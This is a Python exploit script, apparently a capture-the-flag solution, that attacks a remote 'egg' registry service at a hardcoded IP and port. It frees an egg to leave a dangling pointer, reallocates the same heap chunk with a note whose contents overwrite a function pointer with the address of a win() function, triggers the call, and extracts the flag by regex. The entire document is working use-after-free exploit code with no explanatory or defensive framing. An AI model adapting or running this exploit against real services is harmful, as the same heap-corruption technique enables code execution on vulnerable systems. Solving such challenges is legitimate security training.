#!/usr/bin/env python3
import re
import socket
import sys
from typing import Union


HOST = "103.54.19.209"
PORT = 31337
WIN = 0x401335


def p64(x: int) -> bytes:
    return x.to_bytes(8, "little")


def recv_until(sock: socket.socket, needle: bytes, timeout: float = 5.0) -> bytes:
    sock.settimeout(timeout)
    data = b""
    while needle not in data:
        chunk = sock.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def sendlineafter(sock: socket.socket, needle: bytes, data: Union[str, bytes]) -> None:
    recv_until(sock, needle)
    if isinstance(data, str):
        data = data.encode()
    sock.sendall(data + b"\n")


def main() -> None:
    host = sys.argv[1] if len(sys.argv) > 1 else HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else PORT

    s = socket.create_connection((host, port), timeout=8)

    # 1) Register egg
    sendlineafter(s, b"Choice: ", b"1")
    sendlineafter(s, b"[REGISTER] Owner name: ", b"a")
    sendlineafter(s, b"[REGISTER] Strength (1-10): ", b"1")
    sendlineafter(s, b"[REGISTER] Egg pattern: ", b"a")

    # 2) Free egg (dangling pointer left in eggs[0])
    sendlineafter(s, b"Choice: ", b"3")
    sendlineafter(s, b"[REMOVE] Egg index (0-", b"0")

    # 3) Allocate note in same 0x70 chunk, overwrite Egg.printer at +0x20
    sendlineafter(s, b"Choice: ", b"4")
    sendlineafter(s, b"[NOTE] Judge name: ", b"judge")
    sendlineafter(s, b"[NOTE] Verdict: ", p64(WIN))

    # 4) Trigger corrupted function pointer via view egg -> calls win()
    sendlineafter(s, b"Choice: ", b"2")
    sendlineafter(s, b"[VIEW] Egg index (0-", b"0")

    out = b""
    s.settimeout(1.5)
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            out += chunk
    except Exception:
        pass
    finally:
        s.close()

    text = out.decode(errors="ignore")
    print(text, end="")

    m = re.search(r"(flag\{[^}\n]+\}|NOVRUZ\{[^}\n]+\}|CTF\{[^}\n]+\})", text, re.I)
    if m:
        print(f"\n[+] Flag: {m.group(1)}")


if __name__ == "__main__":
    main()
